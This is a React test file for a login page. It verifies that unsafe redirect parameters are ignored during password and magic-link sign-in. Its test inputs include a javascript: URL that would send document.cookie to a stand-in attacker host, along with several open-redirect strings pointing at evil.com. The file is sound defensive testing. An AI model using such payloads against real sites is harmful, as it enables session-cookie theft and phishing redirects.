import { fireEvent, render, screen, waitFor } from '@testing-library/react'
import { beforeEach, describe, expect, test, vi } from 'vitest'
import LoginPage from '@/app/login/page'

const mocks = vi.hoisted(() => ({
  push: vi.fn(),
  search: '',
  signUp: vi.fn(),
  signInWithPassword: vi.fn(),
  signInWithOtp: vi.fn(),
}))

vi.mock('next/navigation', () => ({
  useRouter: () => ({ push: mocks.push }),
  useSearchParams: () => new URLSearchParams(mocks.search),
}))

vi.mock('@/lib/supabase/client', () => ({
  createClient: () => ({
    auth: {
      signUp: mocks.signUp,
      signInWithPassword: mocks.signInWithPassword,
      signInWithOtp: mocks.signInWithOtp,
    },
  }),
}))

vi.mock('@/lib/analytics', () => ({ track: vi.fn() }))

function fillPasswordForm() {
  fireEvent.change(screen.getByLabelText('Email'), { target: { value: 'a@example.com' } })
  fireEvent.change(screen.getByLabelText('Password'), { target: { value: 'password123' } })
}

describe('login redirect sanitisation', () => {
  beforeEach(() => {
    mocks.push.mockReset()
    mocks.signInWithPassword.mockReset().mockResolvedValue({ error: null })
    mocks.signInWithOtp.mockReset().mockResolvedValue({ error: null })
    mocks.signUp.mockReset().mockResolvedValue({ error: null })
  })

  test.each([
    "javascript:fetch('//evil.tld/?'+document.cookie)",
    '//evil.com/login',
    '/\\evil.com',
    'https://evil.com',
  ])('password sign-in ignores unsafe redirect %s', async (redirect) => {
    mocks.search = `redirect=${encodeURIComponent(redirect)}`
    render(<LoginPage />)
    fillPasswordForm()
    fireEvent.submit(screen.getByLabelText('Password').closest('form')!)
    await waitFor(() => expect(mocks.push).toHaveBeenCalledWith('/dashboard'))
  })

  test('keeps a safe relative redirect for sign-in and emailRedirectTo', async () => {
    mocks.search = `redirect=${encodeURIComponent('/dashboard/checkout?trip_id=t1')}`
    render(<LoginPage />)
    fillPasswordForm()
    fireEvent.submit(screen.getByLabelText('Password').closest('form')!)
    await waitFor(() => expect(mocks.push).toHaveBeenCalledWith('/dashboard/checkout?trip_id=t1'))

    fireEvent.click(screen.getByRole('button', { name: 'Magic link' }))
    fireEvent.change(screen.getByLabelText('Email'), { target: { value: 'a@example.com' } })
    fireEvent.click(screen.getByRole('button', { name: 'Send magic link' }))
    await waitFor(() => expect(mocks.signInWithOtp).toHaveBeenCalledTimes(1))
    const redirectTo = mocks.signInWithOtp.mock.calls[0][0].options.emailRedirectTo as string
    expect(redirectTo).toBe(`${window.location.origin}/auth/callback?next=${encodeURIComponent('/dashboard/checkout?trip_id=t1')}`)
  })

  test('magic link emailRedirectTo never carries an off-site next', async () => {
    mocks.search = `redirect=${encodeURIComponent('//evil.com')}`
    render(<LoginPage />)
    fireEvent.click(screen.getByRole('button', { name: 'Magic link' }))
    fireEvent.change(screen.getByLabelText('Email'), { target: { value: 'a@example.com' } })
    fireEvent.click(screen.getByRole('button', { name: 'Send magic link' }))
    await waitFor(() => expect(mocks.signInWithOtp).toHaveBeenCalledTimes(1))
    const redirectTo = mocks.signInWithOtp.mock.calls[0][0].options.emailRedirectTo as string
    expect(redirectTo.endsWith(`next=${encodeURIComponent('/dashboard')}`)).toBe(true)
  })
})
